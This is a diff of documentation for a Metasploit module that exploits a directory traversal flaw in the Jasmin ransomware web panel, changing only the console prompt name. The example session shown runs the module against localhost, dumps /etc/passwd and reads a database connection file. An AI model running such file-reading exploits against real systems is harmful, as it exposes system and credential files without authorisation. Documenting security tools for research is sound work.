@@ -51,12 +51,12 @@ database credentials.
 ### Jasmin installed on Ubuntu 22.04
 
 ```
-msf6 > use auxiliary/gather/jasmin_ransomware_dir_traversal
-msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > set rhosts 127.0.0.1
+msf > use auxiliary/gather/jasmin_ransomware_dir_traversal
+msf auxiliary(gather/jasmin_ransomware_dir_traversal) > set rhosts 127.0.0.1
 rhosts => 127.0.0.1
-msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > set verbose true
+msf auxiliary(gather/jasmin_ransomware_dir_traversal) > set verbose true
 verbose => true
-msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > rexploit
+msf auxiliary(gather/jasmin_ransomware_dir_traversal) > rexploit
 [*] Reloading module...
 
 [+] root:x:0:0:root:/root:/bin/bash
@@ -118,10 +118,10 @@ mysql:x:136:143:MySQL Server,,,:/nonexistent:/bin/false
 [+] Saved file to: /root/.msf4/loot/20240415125844_default_127.0.0.1_jasmin.webpanel._670418.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > set FILE var/www/html/data
+msf auxiliary(gather/jasmin_ransomware_dir_traversal) > set FILE var/www/html/data
 base/db_conection.php
 FILE => var/www/html/database/db_conection.php
-msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) > rexploit
+msf auxiliary(gather/jasmin_ransomware_dir_traversal) > rexploit
 [*] Reloading module...
 
 [+] <?php
@@ -134,6 +134,6 @@ mysqli_select_db($dbcon,"jasmin_db");
 [+] Saved file to: /root/.msf4/loot/20240415125905_default_127.0.0.1_jasmin.webpanel._177654.txt
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-msf6 auxiliary(gather/jasmin_ransomware_dir_traversal) >
+msf auxiliary(gather/jasmin_ransomware_dir_traversal) >
 ```
 
